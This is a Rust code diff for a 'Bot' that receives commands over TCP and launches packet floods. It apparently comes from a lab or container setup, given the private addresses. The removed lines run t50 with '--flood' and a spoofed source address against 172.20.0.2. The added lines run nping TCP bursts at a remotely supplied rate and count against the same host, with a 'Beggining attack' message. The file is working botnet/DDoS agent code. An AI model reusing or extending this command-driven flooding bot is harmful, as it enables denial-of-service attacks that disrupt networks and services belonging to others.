@@ -1,6 +1,6 @@
 #![allow(dead_code)]
 use std::io::prelude::*;
-use std::net::{TcpStream, TcpListener};
+use std::net::{TcpListener, TcpStream};
 use std::process::Command;
 
 pub trait Device {
@@ -55,25 +55,19 @@ impl Bot {
         match n {
             Ok(msg_len) => {
                 let msg = String::from_utf8_lossy(&buffer[..msg_len]);
-                println!(
-                    "Message received: {:?}",
-                    msg
-                );
-                let mut parts = msg
-                    .split_whitespace();
-                let cmd: String = parts.next().unwrap().to_string();
-                if cmd == "1" {
-                    let duration: String = parts.next().unwrap().to_string();
-                    println!("Beggining attack");
-                    let cmd_handle = Command::new("timeout")
-                        .args(&[&duration, "t50","172.20.0.2", "--flood", "-p", "tcp", "-s", "172.18.0.6"])
-                        .output()
-                        .expect("failed to run t50");
-                    println!("{}", String::from_utf8(cmd_handle.stdout).unwrap());
-                }
+                println!("Message received: {:?}", msg);
+                let mut parts = msg.split_whitespace();
+                let rate: String = parts.next().unwrap().to_string();
+                let count: String = parts.next().unwrap().to_string();
+                println!("Beggining attack");
+                let cmd_handle = Command::new("nping")
+                    .args(&["--tcp", "--rate", &rate, "-c", &count, "-q", "-N", "172.20.0.2"])
+                    .output()
+                    .expect("failed to run t50");
+                println!("{}", String::from_utf8(cmd_handle.stdout).unwrap());
             }
             Err(error) => println!("Error encountered: {}", error),
-        }; 
+        };
     }
 }
 
